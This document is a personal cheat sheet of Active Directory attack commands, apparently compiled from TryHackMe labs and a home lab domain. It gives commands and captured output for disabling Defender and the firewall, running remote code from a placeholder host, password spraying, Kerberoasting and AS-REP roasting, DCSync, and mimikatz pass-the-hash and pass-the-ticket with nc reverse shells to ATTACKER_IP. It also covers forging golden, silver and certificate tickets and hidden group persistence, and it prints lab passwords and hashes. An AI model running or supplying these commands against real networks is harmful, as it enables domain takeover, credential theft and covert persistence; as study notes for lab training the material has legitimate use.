### basic command of domain
  sysdm.cpl   #computer config
  dsa.msc  #AD mgr,add delete user
  net userusername passwd /add /domain     #add domain user
  net group "Domain Admins" clare /add /domain   #add a user to dmmain admin group
  gpupdate /force      #update the gp group policy. \n
  net share sharename=c:\foldername          # share a folder
  setspn HTTP/nameofhost(sql.inmy.com) inmy\sqladmin

#### powershell history
Powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
setspn -T medin -Q ​ */*  //to extract all accouint in SPN, when we have a normal user in a hsot in AD

#### AppLocker is an application whitelisting technology introduced with Windows 7
  
//pwershell to downlaod file
      powershell -ep bypass;
      iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/xx')
      or curl http://xxx/xx -o xx
  >net accounts    /login policy
  >Write-Output "${env:COMPUTERNAME}"  //get computername
  //if the display of shell is not recgnized,
    chcp 65001  //change to utf encode

    netstat -nao //check the services running on Win
  
    net user $username $passwd  //change the passwd of a user
  #### turn off firewall
    $netsh advirewall set allprofiles state off
  #### check firewall status
    $netsh advirewall show all profiles
  #### close defender AV
    $REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f 
    $gpupdate /force

  #### allow rdp
    $REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    $netstat -nao

  #### rdp to win
    $xfreerdp /u:$username /p:$passwd /v:$IP
  #### verify the hash type
    $hashid


    
### emulate info of domain
  powershell.exe -nop -exec bypass  #fireup the powershell
    #Powerview to emulate the domain infor;
  Import-Module .\PowerView.ps1
  Get-NetDOmain
  >Get-NetUser | select cn
  Get-NetGroup \n
    Get-NetComputer
    Find-LocalAdminAccess  #important
  
    Get_NetSession -ComputerName $computerName  #get other user which has net session with this host& not guarantee to use
      
    Get-NetLoggedon -ComputerName $cumputername # get remote access from other user. & not guarantee to use
####  PowerUp1.ps1
  get Administrator access.
    the result will be :  C:\Windows\Panther\Unattend\Unattended.xml.
####passwd hash format of win
  hashcat -m 13100
### mimikaz :to get the hash of remote access admin
  privilege::debug    #run this first, to test the privi of mimikaz

  sekurlsa::logonPasswords  #to view the passwd or passwd hash of user login this host

###  check services running on this host or domain by spn
  Get-NetUser -SPN select serviceprincipalname, samaccountname

  net user sqladmin /domain

### check the privi of account to Domain admins grp "ActiveDirectoryRIghts" like gernericAll
  Get-objectAcl -Identify "Domain admins"   /only get the SID of the account

  Convert-SidToName $UID  /to convert

  / if we find a SID is diff from other,, try to compromise this ID
  / net group "Domain Admins" $username(which you controlled)  /add /domain
    / net group "Domain Admins" $username(which you controlled)  /del /domain
  
### sharphound    /sharphound to collect info, send to host, bloodhound to view the result
  Sharphound.exe --Domain za.tryhackme.com --ExcludeDCs
  
  / /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1
  Import-Module .\SharpHound

  Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\ -OutputPrefix "$name"  /a file.zip will be created. 

  Invoke-RestMethod -Uri $serveruri  -Method Post -InFile #dir -UserDefaultCredentials

  nc -nvlp $port > name.zip

  ####neo4j   for bloodhound
    $sudo neo4j start

    $bloodhound
      upload the .zip==> analysis ==> shortest paths
          match (m:Computer) return m , or m:User
          then mark a cimputeror user as owned. click shortest path from owned priciplals
          right click the connection to view the suggestions.

  ### passwd spray
    /netexec   #pwned means right.    # -u listofname.txt

    $ netexec smb 10.0.2.14 -u 'alice' -p 'Bendac' -d inmy.com --continue-on-success 
      SMB         10.0.2.14       445    WIN10-3ALICE     [*] Windows 10 Pro 10240 x64 (name:WIN10-3ALICE) (domain:inmy.com) (signing:False) (SMBv1:True)
      SMB         10.0.2.14       445    WIN10-3ALICE     [+] inmy.com\alice:Bendan1024 (Pwn3d!)

    /kerbrute.exe

  ### without pre-auth from kerburos. anyone can request a SK1 without auth.
  #### sk1 is encrypted by requestors passwd hash. so, from sk1 we can decrypt the passwd from hash. But we need a passwd of a account like Alice 
    /let's say, bob has this privi
    $ impacket-GetNPUsers -dc-ip 10.0.2.3 -request -outputfile hash inmy.com/alice
      Impacket v0.12.0.dev1 - Copyright 2023 Fortra
      Password:
      Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
      ----  --------  --------------------------  --------------------------  --------
      bob             2024-12-02 23:59:40.852364  2024-12-05 00:50:13.750371  0x400200 
      
      $krb5asrep$23$bob@INMY.COM:78235c4750327c8df4b5bf6996228911$ec2d6341b2d2085f26eed262f7eb954  
    Then use hashcat to bruteforce the hash, the last one the used in kerberos AS-REQ
      $ hashcat --help | grep -i kerberos
        19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
        19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
        28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
        19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
        19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
        28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
         7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
        13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
        18200 | Kerberos 5, etype 23, AS-REP

      $ hashcat -m 18200 hash passwd.txt #passwd list is requrired.
          hashcat (v6.2.6) starting

  ### crack the SPN account by using a user account TGS-REQ
    $ impacket-GetUserSPNs -request -dc-ip 10.0.2.3 inmy.com/alice:Bendan1024
      Impacket v0.12.0.dev1 - Copyright 2023 Fortra
      
      ServicePrincipalName     Name      MemberOf                                  PasswordLastSet             LastLogon                   Delegation 
      -----------------------  --------  ----------------------------------------  --------------------------  --------------------------  ----------
      HOST/sqladmin.inmy.com   sqladmin  CN=Domain Admins,CN=Users,DC=inmy,DC=com  2024-12-03 00:01:55.946450  2024-12-05 14:15:26.229537             
      HTTP/sqladmin.inmy.com   sqladmin  CN=Domain Admins,CN=Users,DC=inmy,DC=com  2024-12-03 00:01:55.946450  2024-12-05 14:15:26.229537             
      MSSQL/sqladmin.inmy.com  sqladmin  CN=Domain Admins,CN=Users,DC=inmy,DC=com  2024-12-03 00:01:55.946450  2024-12-05 14:15:26.229537             
      
      [-] CCache file is not found. Skipping...
      $krb5tgs$23$*sqladmin$INMY.COM$inmy.com/        sqladmin*$f1f58632d5f5860fa52120c981839492$70d2d8e7fcf92b114d8e29efc7ebacedb346ff7a4b84be120bf234cbecb22fc6091187bd70d7db88307083bd8994bdf8961022bddcce00b2067df6451561b00cfe2d
        //if met 'Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)'
          $ sudo timedatectl set-ntp 0  /to stop ntp
          $ sudo rdate -n 10.0.2.3 /may need this to syc date from DC DNS server
      //put the result into hash.kerberos to crach it using hashcat
      $hashcat -m 13100 hash.kerberos passwd.txt 
        hashcat (v6.2.6) starting
    #### with the Account of SPN service, to create golden ticket to a particular service
      $whoami /user   //to get SUID of domain
        用户名        SID
        ============= =============================================
        inmy\sqladmin S-1-5-21-424443570-3024089592-1732281603-1107
          // S-1-5-21-424443570-3024089592-1732281603 domain ID  
              1107 is user ID
  ### with a account od domain, use sync DC method to get other account of domain
    $ impacket-secretsdump -just-dc-user administrator inmy.com/alice:"passwdofalice"@$IPofDC
    Impacket v0.12.0.dev1 - Copyright 2023 Fortra
    
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Using the DRSUAPI method to get NTDS.DIT secrets
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:73394b31c1dfc30c5e91c2366f5450d8:::
    [*] Kerberos keys grabbed
    Administrator:aes256-cts-hmac-sha1-96:c0c06f9870d66863b1163a711808b95f2408e7db3c1a47ff6336a61322f90506
    Administrator:aes128-cts-hmac-sha1-96:acf685382eadbc50364359ecc85923df
    Administrator:des-cbc-md5:2f3ed6b5cefef7fd
    [*] Cleaning up... 

      //Administrator:500:aad3b435b51404eeaad3b435b51404ee:73394b31c1dfc30c5e91c2366f5450d8:::
        73394b31c1dfc30c5e91c2366f5450d8 is the hash
  
  ## AD moving
    ### protocol wmi port 135
      $wmic "/node:win10-3-bob" process call create "cmd" or
      $wmic 
        > "/node:win10-3-bob" process call create "cmd"

      $tasklist  //to check applications running


      #### powershell way
        $username = 'alice';
        $passwd = 'passw';
        $secureString = ConvertTo-SecureString $passwd -AsPlainText -force;
        $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
        $Options = New-CimSessionOption -Protocol DCOM
        $session = New-CimSession -ComputerName 10.0.2.14 -Credential $credential -SessionOption $Options
        
        //you will 
            Id           : 1
            Name         : CimSession1
            InstanceId   : 9fdc188c-7004-40e7-b33b-337e03719064
            ComputerName : 10.0.2.14
            Protocol     : DCOM
        
        
        $Invoke-CimMethod -CimSession $session -ClassName Win43_process -MethodName Create -Arguments @{commandline = $command};
        //you will get 
            ProcessId ReturnValue PSComputerName
            --------- ----------- --------------
                            21 10.0.2.14

      #### win impacket-wmiexec -hashed $hash Adminstrator@IP  //or plain passwd
      
    ### protocol winrm port 5985,5986
        //to enable winrm 
        $Enable-PSRomenting -force

        //inside domain, winrs to exec shell
        $ winrs -r:"dc-server01" "cmd /c hostname & whoami"

        //outside the domain
        $winrs -r:"$hostname" -u:$username -p:Passwd "c,d /c xxxxxx"  //it is suggested to used base64 encoded codes after /c

        //in kali
        $ evil-winrm -u $uesrn -p passwd -i 10.0.2.14 

        // ps - only if this user has the admin privi on this host, or use the admin's passwd to start the session
        $New-PSSession -ComputerName $name  //to start a new ps session

        $Enter-PSSession 1   //to enter this session

    ### if the DC administrator login on a host. use mimikatz get the cached hash. apply TGT
        $mimikatz # sekurlas::pth /user:$Aministror /domain:inmy.com /ntlm <hash> /run:PowerShell.exe
      
  ### AD
   
    #### pass the hash
      //use mimikatz load hash in the memory, and get the session of this user.
      mimikatz # privilege::debug
      mimikatz # token::elevate  //get the hash
      mimikatz # token::revert
      mimikatz # sekurlsa::pth /user:username /domain:DOmain /ntlm:hash /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555" //run cmd to get a reverseshell
      user@AttackBox$ nc -lvp 5555
    #### pass the key
      mimikatz # privilege::debug
      mimikatz # sekurlsa::ekeys  //to get the encrypted key
      mimikatz # sekurlsa::pth /user:username /domain:domain /rc4(or aes256 etc.):96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
      user@AttackBox$ nc -lvp 5555
      winrs.exe -r:THMIIS.za.tryhackme.com cmd  //use winrx to ssh to other host with the privi of this user(with hash)
    #### pass the ticket
      mimikatz # privilege::debug
      mimikatz # sekurlsa::tickets /export  //get all tickets on the host
      mimikatz # kerberos::ptt (after ppt is the path of ticekt saved)[0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi  //injecting ticket
    #### DC Sync of a single account
      lsadump::dcsync /domain:za.tryhackme.loc /user:xxx
      Golden ticket
      // forge a golden ticket, we need the KRBTGT account's password hash
        mimikatz # kerberos::golden /admin:forge /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-269
        3558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
        User      : forge
        Domain    : za.tryhackme.loc (ZA)
        SID       : S-1-5-21-3885271727-2693558621-2658995185
        User Id   : 500
        Groups Id : *513 512 520 518 519
        ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
        Lifetime  : 7/22/2025 8:53:52 AM ; 7/22/2025 6:53:52 PM ; 7/29/2025 8:53:52 AM
        -> Ticket : ** Pass The Ticket **
        
         * PAC generated
         * PAC signed
         * EncTicketPart generated
         * EncTicketPart encrypted
         * KrbCred generated
        
        Golden ticket for 'forge @ za.tryhackme.loc' successfully submitted for current session
        
      Silver ticket
        mimikatz # kerberos::golden /admin:forge /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-269
        3558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:39f46ddb810ea482850bb93f4c1e4cc5 /service:
        cifs /ptt
        User      : forge 
        Domain    : za.tryhackme.loc (ZA)
        SID       : S-1-5-21-3885271727-2693558621-2658995185 
        User Id   : 500
        Groups Id : *513 512 520 518 519
        ServiceKey: 39f46ddb810ea482850bb93f4c1e4cc5 - rc4_hmac_nt       
        Service   : cifs
        Target    : THMSERVER1.za.tryhackme.loc
        Lifetime  : 7/22/2025 9:05:02 AM ; 7/20/2035 9:05:02 AM ; 7/20/2035 9:05:02 AM
        -> Ticket : ** Pass The Ticket **
        
         * PAC generated
         * PAC signed
         * EncTicketPart generated
         * EncTicketPart encrypted 
         * KrbCred generated
        
        Golden ticket for 'forge @ za.tryhackme.loc' successfully submitted for current session

        sign own certificates by using private cert
          //use mimikatz to load the certi
          mimikatz # crypto::certificates /systemstore:local_machine  //check if we can view cert on DC
          mimikatz # privilege::debug
          mimikatz # crypto::capi
          Local CryptoAPI RSA CSP patched
          Local CryptoAPI DSS CSP patched
          
          mimikatz # crypto::cng
          "KeyIso" service patched
          mimikatz # crypto::certificates /systemstore:local_machine /export
            .pfx is the cert file
          ForgeCert.exe --CaCertPath c:\Users\grace.clarke\local_machine_My_0_.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword tryhackme 
          Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Tools\ForgeCert\fullAdmin.pfx /password:tryhackme /outfile:my.kirbi /domain:za.tryhackme.loc /dc:10.50.
          mimikatz # kerberos::ptt my.kirbi
        persistance by adding group member
           //create some of our own groups. Let's start by creating a new base group that we will hide in the People->IT Organisational Unit (OU):
          New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
          //create another group in the People->Sales OU and add our previous group as a member:
          New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
          Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
          //nest a couple more groups,With the last group, add that group to the Domain Admins group
          Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
          //add our low-privileged AD user to the first group
          Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
      #### Got credential
        clear-text
          commands history, C:\Users\xxUSER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
          Configuration files (Web App, FTP files, etc.)
          Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
          Backup files
          Shared files and folders
          Registry
          Source code 
          Window registry       reg query HKLM /f password(keyword) /t REG_SZ /s
          Password Managers
          Memory Dump
          Active Directory  
            Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description  //in the description
        FROM LOCAL windows
          //copy SAM and SYSTEM , SAM is the credential, system is the key
          1.  wmic shadowcopy call create Volume='C:\'
              vssadmin list shadows
              copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam    //use volume shadow
              copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
          2. reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg   //use register
            reg save HKLM\system C:\users\Administrator\Desktop\system-reg
          3. use .py to decypted
            python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
   #### explode AD
     Exploiting Permission Delegation
      ACE access control entries  //use in AD
            ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
            AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
            GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
            GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
            WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
            WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
            AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.
      //use sharphound get  infor of AD, bloodhound to get a path, and the ACE we can use.
        Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
        Get-ADGroupMember -Identity "IT Support"  //add new member to a gourp 
      // change passwd of a user in a target group
      $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
      Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 
      gpupdate /force // wait until the privi updated.
      
    Exploiting Kerberos Delegation
      Import-Module C:\Tools\PowerView.ps1 
      Get-NetUser -TrustedToAuth  //to find privileged user for the network, we find svcIIS here. and get the plain text passwd

      mimikatz # token::elevate  //admin privi required, we have tir2_xxx account
      lsadump::secrets
                token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
                lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.
      
      kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:xxx //kekeo to create tgt and tgs
      kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
      kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc

      mimikatz # privilege::debug  //mimikatz to import the tgs
      mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi 
      exit and klist to check whterh the tgs loaded.


      PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc
      PS C:\> Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc  //WS-MAN is native to Windows and leverages the SOAP protocol,use to login the target host.
